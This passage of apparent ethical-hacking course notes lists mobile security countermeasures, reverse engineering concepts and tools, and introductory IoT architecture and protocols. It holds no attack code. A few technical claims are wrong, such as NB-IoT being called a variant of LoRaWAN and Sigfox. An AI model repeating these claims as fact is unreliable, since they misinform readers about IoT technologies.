				- Store sensitive data in secure, restricted-access storage locations.
				- Enforce strong access controls to prevent unauthorized access to sensitive data.
				- Apply input validation and data sanitization techniques to mitigate injection attacks.
				- Use secure session management techniques, including:
					- Random session token generation
					- Setting appropriate session timeouts
					- Securely storing session data on both the client and server
				- Regularly update and patch all libraries, frameworks, and third-party dependencies.
			- Insufficient Cryptography:
				- Use strong encryption algorithms with sufficient key length.
				- Implement secure key management practices, including the use of key vaults or hardware security modules (HSMs) for secure key storage.
				- Avoid custom encryption implementations.
				- Securely store encryption keys on the mobile device.
				- Use secure transport layer protocols like HTTPS to encrypt data during transmission.
				- Ensure proper validation of certificates, digital signatures, and other authentication mechanisms.
				- Apply timely security updates, patches, and recommendations for cryptographic libraries, frameworks, and platforms.
				- Conduct comprehensive security testing, including:
					- Cryptographic vulnerability assessments
					- Penetration testing
					- Code reviews
				- Adhere to industry standards and best practices in cryptography.
				- Use strong hash functions such as SHA-256 or bcrypt.
				- Implement salting when hashing passwords.
				- Use key derivation functions such as PBKDF2, bcrypt, or scrypt for secure password hashing.
		- General Guidelines for Mobile Platform Security:
			- Below are various guidelines to help protect your mobile device:
			- Application Management:
				- Avoid installing too many applications and disable automatic photo uploads to social networks.
				- Perform a security assessment of application architecture before installation.
				- Install applications only from trusted app stores.
				- Maintain proper configuration control and management.
			- Device Security:
				- Securely wipe or delete data before disposing of a device.
				- Do not share sensitive information within GPS-enabled apps unless necessary.
				- Never connect two separate networks (e.g., Wi-Fi and Bluetooth) simultaneously.
				- Disable wireless access (Wi-Fi and Bluetooth) when not in use:
					- Ensure Bluetooth is off by default and only enable it when necessary.
					- Disable wireless access to prevent unauthorized access to the device.
					- Disable internet sharing/tethering over Wi-Fi and Bluetooth when not needed.
			- Passcode Protection:
				- Configure a strong passcode with the maximum possible length.
				- Set an idle timeout to automatically lock the device when not in use.
				- Enable the lockout/wipe feature after multiple failed login attempts.
				- Use a complex passcode with at least eight characters.
				- Prevent passcode guessing by enabling the erase data option after failed attempts.
			- System & Application Updates:
				- Regularly update the operating system and apps to maintain security.
				- Apply software updates as soon as they become available.
				- Perform routine software maintenance.
			- Remote Management & Security Policies:
				- In enterprise environments, use Mobile Device Management (MDM) software to secure, monitor, manage, and support mobile devices.
				- Prevent or detect rooting/jailbreaking through MDM solutions and include this requirement in security policies.
			- Data Protection:
				- Use remote wipe services such as Find My Device (Android) and Find My iPhone (iOS) to locate or erase a lost/stolen device.
				- Report lost or stolen devices to IT so they can disable access credentials.
				- Encrypt device storage using hardware encryption (if supported).
				- Enable encryption for both device storage and backups.
			- Backup & Synchronization:
				- Use secure, over-the-air backup tools with periodic background synchronization.
				- (Android) Backup data to a Google account while ensuring enterprise data is not stored in personal cloud services.
				- Control the location of backups and ensure they are encrypted.
				- Keep sensitive data off shared mobile devices.
				- Limit log data stored on the device.
				- Use secure data-transfer utilities or encrypt data in transit to ensure confidentiality and integrity.
			- Email & Application Security:
				- Configure email forwarding filters through server-side corporate email settings.
				- Use commercial data loss prevention (DLP) filters.
				- Prevent local caching of emails on devices.
				- Allow only signed applications to install or execute.
				- Configure networks to require manual confirmation before joining new Wi-Fi networks.
				- Sandbox applications and data for better security.
				- Enable auto-lock and set a one-minute timeout.
				- Limit the use of location services to trusted applications only.
				- Disable location tracking for apps that do not need access.
				- Configure notification settings to prevent sensitive data from being displayed on the lock screen.
				- Adjust AutoFill settings to reduce password exposure while balancing convenience and security.
				- Disable diagnostics and usage data collection under Settings -> General -> About.
			- Web & Connectivity Security:
				- Enforce strict browser permission rules according to company policies.
				- Use secure network protocols (e.g., TLS) for communication.
				- Avoid public Wi-Fi unless using a VPN.
				- Prefer cellular data networks over public Wi-Fi.
			- Enterprise Policies & Best Practices:
				- Establish clear mobile device policies defining accepted usage, support levels, and access permissions.
				- Control devices and applications through policy enforcement.
				- Prohibit the use of USB keys for data transfer.
				- Restrict unauthorized operating system or application modifications.
				- Lock your device using the power button whenever it is not in use.
				- Verify printer locations before printing sensitive documents.
				- Consult IT on using Citrix technologies to separate enterprise and personal data.
				- If sensitive data must be stored on a mobile device, use enterprise-managed solutions such as ShareFile.
				- Deploy anti-malware applications to detect and block malicious software.
				- Enforce multi-factor authentication (MFA) to prevent unauthorized access.
				- Always log out of applications after use—especially those linked to other accounts.
		- Mobile Device Security Guidelines for Administrators:
			- Below are key guidelines that administrators can implement to maintain corporate mobile device security:
			- Publish an enterprise policy specifying acceptable usage of consumer-grade devices and BYOD (Bring Your Own Device) in the enterprise.
			- Establish an enterprise policy for cloud usage.
			- Enable security measures, such as antivirus protection, to safeguard data in the data center.
			- Implement a policy defining permissible levels of application and data access on consumer-grade devices and specifying any restrictions.
			- Enforce session timeouts through the Access Gateway.
			- Define whether domain passwords can be cached on devices or if users must enter them each time they request access.
			- Determine allowed Access Gateway authentication methods from the following options:
				- No authentication
				- Domain authentication only
				- SMS authentication
				- RSA SecurID only
				- Domain + RSA SecurID
			- Develop and maintain a comprehensive mobile device security policy that outlines:
				- Organizational resources accessible via mobile devices
				- Approved mobile device types
				- Access privileges and security requirements
			- Create system threat models for mobile devices and the resources accessed through them to support the design of robust security solutions.
			- Ensure all necessary security settings are enabled on mobile devices before issuing them to users.
			- Regularly maintain mobile device security by:
				- Keeping the OS and applications up to date
				- Synchronizing mobile clocks with a common time source
				- Reconfiguring access privileges as needed
				- Identifying and documenting any security anomalies within the device infrastructure
			- Monitor compliance to ensure users follow mobile device security policies and procedures.
			- Evaluate the best services offered by various providers, select those that align with organizational needs, and implement solutions accordingly.
			- Test security solutions before deploying them in production, assessing factors such as authentication, application functionality, security, connectivity, and performance.
			- Use a management console to restrict access to open public Wi-Fi networks.
			- Implement unified endpoint management (UEM) solutions that extend enterprise mobility management (EMM) and mobile application management (MAM) to all endpoints.
			- Utilize mobile threat defense (MTD) platforms that provide advanced security features, such as behavioral analysis.
			- Deploy biometric authentication methods, including fingerprint, voice, facial, or iris recognition.
			- Use a cloud access security broker (CASB) to add an extra security layer between cloud users and service providers.
			- Employ effective endpoint security solutions to standardize security policies and alert administrators to potential risks.
			- Implement application protection and data loss prevention (DLP) policies to prevent company data from being stored locally on mobile devices.
			- Securely erase data from mobile devices before decommissioning or reassigning them.
			- Establish and enforce standardized configurations for mobile devices, including disabling unnecessary services and features.
		- SMS Phishing Countermeasures:
			- To defend against SMS phishing (smishing) attacks, follow these countermeasures:
			- Never reply to a suspicious SMS without verifying the sender.
			- Do not click on links included in SMS messages.
			- Avoid responding to SMS messages requesting personal or financial information.
			- Review your bank’s policy on sending SMS messages.
			- Enable the "Block texts from the internet" feature from your mobile provider.
			- Be cautious of SMS messages that create a sense of urgency or pressure you to respond quickly.
			- Never call a phone number provided in an unsolicited SMS.
			- Ignore messages promising unexpected gifts, prizes, or offers.
			- Be wary of messages sent via internet text relay services, as attackers may use them to hide their identity. Avoid messages from non-telephonic numbers.
			- Check for spelling mistakes, grammatical errors, or inconsistent language in text messages.
			- Avoid spam messages by rejecting subscription or sign-up options from unknown third-party vendors.
			- Do not store sensitive information such as credit card details, PINs, or passwords on your mobile phone.
			- Report any fraudulent SMS messages to help prevent further attacks.
			- Install anti-phishing software or SMS filtering tools.
			- Keep mobile devices updated with the latest anti-malware software.
			- Enable multi-factor authentication (MFA) to add an extra layer of security.
			- Organizations should use official short codes for communication to enhance legitimacy.
			- Develop a clear response plan for smishing incidents and ensure employees using BYOD (Bring Your Own Device) policies are informed.
			- Conduct phishing simulations to test user awareness and response to smishing attempts.
			- Use authorized messaging platforms like Signal or WhatsApp for internal communications.
			- Implement educational programs to train users on smishing risks and safe communication practices.
		- OTP Hijacking Countermeasures:
			- The following are various countermeasures for defending against OTP hijacking attacks.
			- For Users:
				- Follow a strong password policy:
					- Create unique and strong passwords.
					- Avoid using the same password for multiple services.
					- Update passwords periodically.
					- Store passwords securely using an encrypted password manager.
				- Regularly update software and operating systems (OS) to the latest version.
				- Be cautious of suspicious emails and links that may lead to malicious sites.
				- Access only Secure Sockets Layer (SSL)-certified websites.
				- Enable SIM locking with a PIN to prevent unauthorized SIM access.
				- Disable the display of sensitive notifications on the lock screen.
				- Avoid using applications that rely on SMS-based authentication.
				- Minimize the use of recovery methods via SMS or email.
				- Never share or forward OTPs, and avoid entering OTPs in the browser while on a call.
				- Always enter OTPs manually in the browser.
			- For Developers:
				- Ensure OTPs are transmitted over secure channels, such as encrypted SMS or secure push notifications.
				- Implement end-to-end encryption for OTP transmission.
				- Use multi-factor authentication (MFA) by combining OTPs with biometric or hardware-based authentication.
				- Limit the number of OTP requests from a single user to mitigate brute-force attacks.
				- Set short expiration times for OTPs to minimize their usability for attackers.
				- Use behavioral analytics to detect anomalies, such as multiple OTP requests in a short period.
				- Educate users about phishing attempts to prevent OTP exposure.
				- Consider implementing hardware-based OTP generators or security keys to enhance security.
				- Use secure protocols for push notifications.
				- Generate OTPs using secure algorithms like HMAC-based OTP (HOTP) or time-based OTP (TOTP).
				- Ensure OTPs are unique for each authentication event and never reused.
		- Critical Data Storage in Android and iOS: KeyStore and Keychain Recommendations:
			- Critical data such as authentication tokens, private information, and secret credentials must be stored in the KeyStore on Android or the Keychain on iOS to ensure security. Below are key recommendations for securely storing critical data:
			- Android:
				- Use authentication mechanisms such as patterns, PINs, passwords, and fingerprints to safeguard keys in the Android KeyStore.
				- Utilize a hardware-backed Android KeyStore to enhance security.
				- Encrypt stored data to ensure it remains unreadable in plaintext.
				- Implement authorization techniques when creating and importing keys.
				- Restrict access to stored keys on the server, ensuring they are accessible only after proper authentication.
				- Store the master key separately from other keys for additional security.
				- Derive encryption keys using a passphrase provided by the user.
				- Store the master key securely within the software implementation of the Android KeyStore if necessary.
				- Keep encryption keys in a private and secure location.
				- When using SharedPreferences, encrypt data to add an additional layer of security.
				- Follow the principle of least privilege, granting access to sensitive data only to authorized components of the app.
				- Avoid hardcoding sensitive data such as API keys, tokens, or credentials in the source code.
				- Obfuscate code and data to make reverse engineering more difficult.
				- Ensure that data transmitted over the network is encrypted using secure protocols like TLS.
				- If using Content Providers to share data between apps, enforce proper permissions and secure data transmission.
			- iOS:
				- Use authentication mechanisms such as Touch ID, Face ID, passcodes, or passwords to protect the Keychain.
				- Employ hardware-backed 256-bit AES encryption for critical data storage.
				- Utilize access control lists (ACLs) to define application access to the Keychain.
				- Store only small chunks of data directly in the Keychain.
				- Specify AccessControlFlags to enforce key authentication.
				- Implement a mechanism to erase Keychain data after an application is uninstalled to prevent unauthorized access.
				- When creating app extensions, ensure that data shared between the main app and extensions is encrypted and secured.
				- Follow secure coding practices to prevent vulnerabilities like buffer overflows or SQL injection.
				- Use secure mechanisms for interprocess communication (IPC) when sharing data between apps or extensions.
				- Before selecting a cloud storage service, ensure it provides encryption and adheres to secure data-handling policies.
		- Reverse Engineering Mobile Applications:
			- Reverse engineering is the process of analyzing and extracting the source code of software or an application and, if necessary, modifying or regenerating it. This technique is used to disassemble a software program or mobile application to identify design flaws, fix bugs, and uncover vulnerabilities. Additionally, it helps improve defense strategies against security threats. Reverse engineering can also be used on mobile platforms to create duplicate or cloned apps.
			- Applications of Reverse Engineering:
				- Understanding and analyzing source code
				- Identifying underlying security vulnerabilities
				- Scanning for sensitive information embedded within the source code
				- Conducting malware analysis
				- Modifying and regenerating applications or software
				- Ensuring mobile apps comply with security standards and regulations, such as GDPR and HIPAA
				- Assessing compatibility of mobile apps across different platforms and devices
				- Debugging and troubleshooting issues to optimize performance
				- Checking for potential infringement on existing patents or copyrights
			- Why Is Reverse Engineering Effective?
				- Mobile security professionals must have a fundamental understanding of reverse engineering techniques for the following reasons:
				- Enhancing Security Analysis:
					- Vulnerability Discovery: Reverse engineering enables security researchers and attackers to identify vulnerabilities in an app's code, such as insecure data storage, improper authentication, and unpatched security flaws.
					- Malware Analysis: By dissecting malicious applications, security professionals can understand their behavior and develop effective mitigation strategies.
					- Understanding Communication Protocols: Reverse engineering helps reveal how an application communicates with its backend servers, allowing security teams to identify potential weaknesses in network security.
				- Conducting Black-Box Testing on Mobile Apps:
					- Modern mobile apps often include security controls that hinder dynamic analysis. Features like end-to-end encryption, SSL, and root detection can prevent interception, modification, and the use of advanced testing tools. Reverse engineering helps bypass these restrictions, enabling security professionals to analyze the source code effectively.
				- Improving Static Analysis in Black-Box Testing:
					- In black-box testing, static analysis of an app’s binary code and bytecode provides insights into its underlying design and operation. This process also helps uncover vulnerabilities, such as hardcoded credentials, that could be exploited by attackers.
				- Conducting Resilience Assessments:
					- To withstand reverse engineering attacks, mobile apps should implement security protection measures, such as Mobile Application Security Verification Standard Anti-Reversing Controls (MASVS-R). The effectiveness of these controls can be evaluated through resilience assessments, where security professionals attempt to reverse engineer and breach an app’s defenses.
				- Ensuring Compliance and Auditing:
					- Verifying Security Measures: Organizations can inspect an app's actual code to ensure compliance with security standards and regulations.
					- Analyzing Third-Party Components: Reverse engineering helps identify vulnerable or non-compliant third-party libraries and components that may pose security risks.
	- Mobile Security Tools:
		- Unlike older mobile devices, today’s smartphones come with advanced computing capabilities and connectivity. They can be used to store data, browse the internet, record videos, send SMS, play games, capture photos, and perform many other tasks. As a result, mobile devices have become a major target for intruders seeking to steal data. Various mobile security tools are discussed below.
		- Source Code Analysis Tools:
			- Syhunt Mobile ( www.syhunt.com): Syhunt Mobile analyzes the source code of mobile applications and performs over 350 vulnerability checks in Java and Kotlin, the primary languages used for Android app development. The tool also supports other key programming languages, such as Swift, Objective-C, and C, which are used for iOS app development. The set of checks tailored for iOS spans 19 vulnerability categories and includes over 240 vulnerability checks. Syhunt Mobile also enables publishers, developers, and QA testers to automatically scan Android and iOS apps for vulnerabilities outlined in the OWASP Mobile Top 10.
			- Android lint (www.android.com)
			- Zimperium’s z3A (www.zimperium.com)
			- Appium (appium.io)
			- Selendroid (selendroid.io)
			- Infer (fbinfer.com)
		- Reverse Engineering Tools:
			- Apktool (apktool.org):
				- Apktool is a powerful tool for reverse engineering third-party, closed-source, binary Android apps. It can decode resources to a form close to their original state and rebuild them after modifications. The tool simplifies app manipulation by providing a structured, project-like file system and automating repetitive tasks such as building APKs.
				- Features:
					- Disassembles resources while preserving their original structure as much as possible
					- Rebuilds decoded resources back into a binary APK/JAR
					- Manages and organizes APKs that rely on framework resources
					- Supports Smali debugging
			- Androguard (github.com)
			- Frida (www.frida.re)
			- JEB (www.pnfsoftware.com)
			- APK Editor Studio (github.com)
			- Bytecode Viewer (github.com)
		- App Repackaging Detectors:
			- Repackaging is the process of extracting an app’s details from legitimate app stores such as the Google Play Store and Apple App Store, modifying it by injecting malicious code, and then redistributing it as an authentic application. Repackaging can also occur during the reverse engineering of an application.
			- App Repackaging Detectors Tools:
				- Appdome (www.appdome.com):
					- Appdome offers a comprehensive mobile runtime application self-protection (RASP) solution designed to secure Android and iOS apps. It provides defense against app tampering, reverse engineering, method hooking, and unauthorized repackaging.
					- Appdome automates mobile app security by integrating a wide range of anti-fraud, anti-malware, and anti-bot features without requiring changes to the source code. Its mobile app integrity and checksum validation feature verifies app integrity by generating checksums for its binary data and structure, preventing unauthorized modifications and fake apps.
				- freeRASP for Android/iOS (github.com)
				- wultra (www.wultra.com)
				- iXGuard (www.guardsquare.com)
				- AndroCompare (github.com)
				- FSquaDRA 2 (github.com)
		- Mobile Protection Tools:
			- Avast Antivirus & Security (play.google.com): Avast Antivirus & Security helps users scan and secure their devices against viruses and other malware while enhancing privacy and optimizing performance. It performs automated scans to detect threats and vulnerabilities, blocking malicious apps before installation. Additionally, it verifies the security of connected Wi-Fi networks.
			- Comodo Mobile Security (www.comodo.com): Comodo Mobile Security provides comprehensive protection for iOS and Android devices. It features a high-performance malware engine, a VPN, ID protection, safe browsing, and an App Lock to secure apps and data. Additional features include SD card protection, cloud scanning, and real-time malware detection to keep devices secure and running smoothly.
			- AVG Mobile Security (www.avg.com): AVG Mobile Security safeguards iOS and Android devices from malware, spyware, and other common threats. It enhances user privacy by securing connections on public Wi-Fi networks (e.g., cafés and airports) with advanced threat detection. The tool also monitors online databases and alerts users if their credentials have been compromised.
			- Norton Mobile Security for iOS (us.norton.com)
			- Mobile Security & Antivirus (play.google.com)
			- Bitdefender Mobile Security (play.google.com)
			- ESET Mobile Security Antivirus (play.google.com)
			- WISeID Personal Vault (play.google.com)
		- Mobile Anti-Spyware:
			- TotalAV (www.totalav.com): TotalAV is a comprehensive security tool designed to detect and block various forms of spyware that attempt to snoop on and exploit user data for financial gain. In addition to combating spyware, TotalAV effectively identifies and prevents all types of malware from infecting user devices. Furthermore, it excels at locating and removing adware, a particularly aggressive and hard-to-remove form of advertising software.
			- Certo: Anti Spyware & Security (play.google.com)
			- Anti Spy Detector – Spyware (play.google.com)
			- iAmNotified - Anti Spy System (iamnotified.com)
			- Anti Spy (www.protectstar.com)
			- Secury - Anti Spy Security (apps.apple.com)
		- Mobile Penetration Testing Toolkits:
			- ImmuniWeb® MobileSuite (www.immuniweb.com):
				- ImmuniWeb® MobileSuite leverages machine learning to enhance and accelerate manual mobile penetration testing for iOS and Android applications. It provides scalable, rapid, and DevSecOps-enabled testing for both mobile apps and their backends, along with tailored remediation guidelines and a zero false-positive SLA. Additionally, it supports SDLC and CI/CD tool integration and offers a Web Application Firewall (WAF) for mitigating mobile backend vulnerabilities.
				- With this toolkit, security professionals can conduct static, dynamic, and interactive security testing using Software Composition Analysis (SCA). It also generates various reports, including Threat-Aware Risk Scoring, Tailored Remediation Guidelines, and CVE, CWE, and CVSSv3 scores.
			- Codified Security (codifiedsecurity.com)
			- Astra Security (www.getastra.com)
			- Appknox (www.appknox.com)
			- Data Theorem’s Mobile Secure (www.datatheorem.com)
			- MobSF (mobsf.live)


--------------------------------------------------

# IoT and OT Hacking

- The Internet of Things (IoT) integrates wireless technology, micro-electromechanical systems, microservices, and the Internet, transforming industries like healthcare, agriculture, energy, and transportation. IoT devices—wearables, industrial appliances, smart grids, and vehicles—generate vast data that must be secured.
- However, many IoT devices lack advanced security, making them vulnerable to cyber threats. As industries digitize, protecting both devices and data is crucial, especially with the convergence of operational (OT) and information technology (IT). Organizations must assess risks and implement security measures accordingly. This module outlines IoT and OT threats and provides strategies to safeguard these systems.
- IoT Hacking:
	- IoT Concepts and Attacks:
		- The Internet of Things (IoT) is a crucial and rapidly evolving topic in technology, economics, and society. It refers to a network of interconnected devices, enabled by the convergence of machine-to-machine communication and big data analytics. IoT represents a forward-looking advancement of the Internet, enhancing the capabilities of physical devices and gradually bridging the gap between the virtual and physical worlds.
		- This section covers key IoT concepts essential for understanding the advanced topics discussed later in this module. Attackers employ various techniques to target IoT devices and networks. This section also explores major IoT threats, including common attack vectors and techniques such as distributed denial-of-service (DDoS) attacks, attacks on HVAC systems, rolling code attacks, BlueBorne attacks, and jamming attacks.
		- What is the IoT:
			- The Internet of Things (IoT), also known as the Internet of Everything (IoE), refers to web-enabled computing devices that have the capability to sense, collect, and transmit data using embedded sensors, communication hardware, and processors. In the IoT, a “thing” is any device embedded in a natural, human-made, or machine-made object that can communicate over a network.
			- The IoT leverages existing and emerging technologies for sensing, networking, and robotics, enabling deeper analysis, automation, and system integration. With the increasing networking capabilities of machines and everyday appliances used in various sectors—such as offices, homes, industries, transportation, buildings, and wearable devices—the IoT opens up vast opportunities for enhancing business operations and customer satisfaction.
			- Some of the key features of the IoT include connectivity, sensors, artificial intelligence (AI), compact devices, and active engagement.
		- How the IoT Works:
			- IoT technology consists of four primary components:
				- IoT devices
				- Gateway systems
				- Cloud-based data storage
				- Remote control via mobile apps
			- These components work together to enable seamless communication between connected devices.
			- Key Components of IoT Technology:
				- Sensing Technology: Sensors embedded in IoT devices collect a wide range of data from their surroundings, such as temperature, gas levels, location, industrial machinery performance, or a patient’s health metrics.
				- IoT Gateways: Gateways act as intermediaries between IoT devices (internal network) and end-users (external network), allowing devices to connect and communicate. The data collected by IoT sensors is transmitted to users or cloud storage through these gateways.
				- Cloud Server/Data Storage: Once data passes through the gateway, it is stored in the cloud, where it undergoes processing and analysis. The analyzed data is then sent to the user, enabling informed decision-making and action.
				- Remote Control via Mobile App: End-users can monitor, control, and retrieve data from IoT devices remotely using smartphones, tablets, laptops, or other connected devices via dedicated mobile applications.
		- Example: Smart Security System:
			- A smart security system installed in a home is connected to an IoT gateway, which enables communication with the internet and cloud infrastructure.
			- The cloud stores data related to all connected devices, including device IDs, current status, access history, and usage patterns.
			- A connection with the cloud server is established via web services.
			- A user with the required mobile app can remotely access the security system from a smartphone. Before gaining access, the user must authenticate themselves. If the credentials match those stored in the cloud, access is granted; otherwise, it is denied to ensure security.
			- If the security system detects unusual activity, it sends an alert to the cloud through the gateway. The cloud verifies the device ID and associated user before delivering the alert notification to the end-user.
		- IoT Architecture:
			- The IoT architecture consists of multiple layers, ranging from the Application Layer at the top to the Edge Technology Layer at the bottom. These layers are designed to meet the needs of various sectors, including society, industry, enterprises, and government.
			- The functions of each layer in the architecture are outlined below:
				- Edge Technology Layer: This layer comprises all hardware components, including sensors, radio-frequency identification (RFID) tags, readers, soft sensors, and the devices themselves. These entities serve as the primary data sources deployed in the field to monitor or sense various phenomena. This layer plays a crucial role in data collection and facilitates connectivity between devices within the network and the server.
				- Access Gateway Layer: This layer acts as a bridge between two endpoints, such as a device and a client. It is responsible for initial data handling, including message routing, message identification, and subscription management.
				- Internet Layer: This layer is essential for communication between endpoints, enabling device-to-device, device-to-cloud, device-to-gateway, and back-end data sharing.
				- Middleware Layer: The middleware layer operates in a two-way mode, serving as an interface between the Application Layer and the Edge Technology Layer. It handles critical functions such as data management, device management, data analysis, data aggregation, data filtering, device information discovery, and access control.
				- Application Layer: Positioned at the top of the IoT architecture, this layer is responsible for delivering services to users across various sectors, including construction, industrial manufacturing, automotive, security, and healthcare.
		- IoT Application Areas and Devices:
			- IoT devices have a wide range of applications across various sectors, simplifying routine tasks and enhancing the standard of living. IoT technology is integrated into smart homes and buildings, healthcare, industrial automation, transportation, security, retail, and more.
			- Some key applications of IoT devices include:
				- Smart Homes and Buildings: IoT-enabled devices such as thermostats, lighting systems, security systems, and other automated systems enhance convenience and efficiency.
				- Healthcare and Life Sciences: Wearable health monitors, implanted heart pacemakers, ECG and EKG devices, surgical equipment, and telemedicine solutions improve patient care and diagnostics.
				- Industrial Internet of Things (IIoT): IoT drives industrial growth through increased production, smart technology transforming manufacturing processes, and new hybrid business models.
				- Transportation: IoT facilitates vehicle-to-vehicle (V2V), vehicle-to-infrastructure (V2I), and vehicle-to-pedestrian (V2P) communication, enhancing traffic management, navigation systems, and parking solutions.
				- Retail: IoT is used for secure payments, targeted advertisements, and product tracking to prevent theft and losses, thereby increasing revenue.
				- IT and Networking: IoT devices such as printers, fax machines, copiers, and PBX monitoring systems improve communication and enable seamless data transfer across long distances.
		- IoT Technologies and Protocols:
			- The Internet of Things (IoT) encompasses a wide range of emerging technologies and expertise. One of the key challenges in the IoT space is the immaturity of these technologies and the services associated with them, along with the reliability of vendors providing these solutions. This presents a significant challenge for organizations seeking to leverage IoT effectively.
			- For successful communication between endpoints, IoT primarily relies on standardized networking protocols. The major communication technologies and protocols, categorized by the range between the source and destination, are as follows:
			- Short-Range Wireless Communication:
				- Bluetooth Low Energy (BLE): Also known as Bluetooth Smart, BLE is a wireless personal area network technology designed for applications in healthcare, security, entertainment, fitness, and more.
				- Light-Fidelity (Li-Fi): Li-Fi is similar to Wi-Fi, with two key differences: the mode of communication and speed. It is a Visible Light Communication (VLC) system that uses common household light bulbs to transfer data at extremely high speeds of up to 224 Gbps.
				- Near-Field Communication (NFC): NFC enables short-range communication using magnetic field induction between two electronic devices. It is primarily used for contactless mobile payments, social networking, and document or product identification.
				- QR Codes and Barcodes: These are machine-readable tags that store product or item information. QR codes are two-dimensional and can be scanned using smartphones, whereas barcodes exist in both one-dimensional (1D) and two-dimensional (2D) forms.
				- Radio-Frequency Identification (RFID): RFID stores data in tags that can be read using electromagnetic fields. It is widely used across various industries, including manufacturing, office security, pharmaceuticals, automobile tracking, livestock management, and pet identification.
				- Thread: Thread is an IPv6-based networking protocol for IoT devices, primarily designed for home automation. It enables local wireless communication between connected devices.
				- Wi-Fi: Wi-Fi is a widely used technology for wireless local area networking (LAN). The most common standard, 802.11n, offers speeds of up to 600 Mbps with a range of approximately 50 meters.
				- Wi-Fi Direct: This enables peer-to-peer communication between devices without requiring a wireless access point. Devices establish communication only after determining which one will act as the access point.
				- Z-Wave: Z-Wave is a low-power, short-range communication protocol designed mainly for home automation. It allows for wireless monitoring and control of household devices such as HVAC systems, thermostats, garage doors, and home entertainment systems.
				- Zigbee: Zigbee is another short-range communication protocol based on the IEEE 802.15.4 standard. It is used for low-data-rate applications over short distances (typically 10–100 meters) in a restricted area.
				- ANT (Adaptive Network Topology): ANT is a wireless sensor network technology designed for short-range communication, primarily used in sports and fitness sensors.
			- Medium-Range Wireless Communication:
				- HaLow: A variant of the Wi-Fi standard, HaLow offers an extended range, making it particularly useful for communications in rural areas. It supports low data rates, reducing both power consumption and transmission costs.
				- LTE-Advanced: An enhancement of LTE, LTE-Advanced is a mobile communication standard that provides higher data rates, extended range, improved efficiency, and better overall performance.
				- 6LoWPAN: IPv6 over Low-Power Wireless Personal Area Networks (6LoWPAN) is an Internet protocol designed for communication between small, low-power devices with limited processing capacity, such as IoT devices.
				- QUIC: Quick UDP Internet Connections (QUIC) is a multiplexed transport protocol that enables faster and more secure communication between IoT devices over the User Datagram Protocol (UDP). It provides security comparable to SSL/TLS.
			- Long-Range Wireless Communication:
				- LPWAN (Low Power Wide Area Network): LPWAN is a wireless telecommunication network designed to enable long-range communication between endpoints while consuming minimal power. Key LPWAN protocols and technologies include:
					- LoRaWAN (Long Range Wide Area Network): LoRaWAN supports applications such as mobile and industrial machine-to-machine (M2M) communication, as well as secure two-way communications for IoT devices, smart cities, and healthcare applications.
					- Sigfox: Sigfox is designed for devices with limited battery life that need to transfer small amounts of data over long distances.
					- Neul: Neul operates within a small portion of the TV white space spectrum, providing high-quality, high-power, and cost-effective network coverage.
				- Very Small Aperture Terminal (VSAT): VSAT is a satellite communication technology that uses small dish antennas to facilitate data transmission for both broadband and narrowband applications.
				- Cellular: Cellular communication is used for long-distance data transmission with high quality. However, it is typically more expensive and consumes more power compared to other long-range communication protocols.
				- MQTT (Message Queuing Telemetry Transport): MQTT is an ISO-standard lightweight messaging protocol designed for long-range communication. It is widely used for transmitting data to remote locations, such as through satellite links.
				- NB-IoT (Narrowband IoT): NB-IoT is a variant of LoRaWAN and Sigfox that utilizes an enhanced physical layer and spectrum specifically designed for machine-to-machine (M2M) communication.
			- Wired Communication:
				- Ethernet: Ethernet is the most widely used network protocol for wired communication. It is a type of Local Area Network (LAN) that enables wired connections between computers within small areas such as buildings, offices, or campuses.
				- Multimedia over Coax Alliance (MoCA): MoCA is a networking protocol that delivers high-definition video and related content to homes using existing coaxial cables.
				- Power-Line Communication (PLC): PLC is a protocol that transmits both power and data over electrical wiring. It is used in various applications, including home automation, industrial devices, and broadband over power lines (BPL).
			- IoT Operating Systems:
				- IoT devices consist of both hardware and software components. The hardware includes end devices and gateways, while the software primarily consists of operating systems. With the growing production of hardware components such as gateways and sensor nodes, traditional IoT devices that previously operated without an OS have begun adopting specialized operating systems designed for IoT applications. These operating systems enhance connectivity, usability, and interoperability.
				- Below are some of the key operating systems used in IoT devices:
					- Windows 10 IoT: A family of operating systems developed by Microsoft for embedded systems.
					- Amazon FreeRTOS: A free, open-source OS designed for IoT microcontrollers, enabling easy deployment, security, connectivity, and management of low-power, battery-operated edge devices.
					- Fuchsia: An open-source OS developed by Google, designed for various platforms, including embedded systems, smartphones, and tablets.
					- RIOT: A lightweight OS with low resource requirements and efficient energy consumption, suitable for embedded systems, actuator boards, and sensors.
					- Ubuntu Core (Snappy): Used in robots, drones, edge gateways, and other IoT applications requiring security and reliability.
					- ARM Mbed OS: Designed primarily for low-power devices such as wearables and other battery-operated IoT devices.
					- Zephyr: A real-time operating system (RTOS) optimized for low-power, resource-constrained IoT devices.
					- Embedded Linux: Used in a wide range of embedded systems, from small to large-scale applications.
					- NuttX RTOS: An open-source RTOS developed for embedded systems, supporting 8-bit and 32-bit microcontrollers.
					- Integrity RTOS: Commonly used in mission-critical applications within aerospace, defense, industrial automation, automotive, and medical sectors.
					- Apache Mynewt: Designed for devices that operate on the Bluetooth Low Energy (BLE) protocol.
					- Tizen: An open-source, Linux-based operating system built for various devices, including smartphones, tablets, smart TVs, wearables, and IoT applications.
			- IoT Application Protocols:
				- CoAP (Constrained Application Protocol): CoAP is a web transfer protocol designed to transfer messages between constrained nodes and IoT networks. It is primarily used for machine-to-machine (M2M) applications, such as building automation and smart energy systems.
				- Edge Computing: Edge computing moves computational processing to the edge of the network, enabling smart devices and gateways to perform tasks and services locally rather than relying solely on cloud-based resources. This improves content caching, delivery, storage, and management of IoT systems.
				- LWM2M (Lightweight Machine-to-Machine): LWM2M is an application-layer communication protocol used for IoT device management, allowing efficient application-level communication between IoT devices.
				- Physical Web: The Physical Web enables faster and more seamless interaction with nearby IoT devices by revealing a list of URLs broadcast by devices using Bluetooth Low Energy (BLE) beacons.
				- XMPP (eXtensible Messaging and Presence Protocol): XMPP is an open standard for real-time communication used in IoT environments. It facilitates the development of interoperable devices, applications, and services for IoT networks.
				- Mihini/M3DA: Mihini/M3DA is a software platform that enables communication between an M2M server and applications running on embedded gateways. It facilitates data and command exchange between IoT applications and M2M servers.
		- IoT Communication Models:
			- IoT technology utilizes various communication models, each with distinct characteristics. These models highlight the flexibility with which IoT devices can communicate with each other or with a client. Below are four key communication models along with their primary characteristics:
			- Device-to-Device Communication Model:
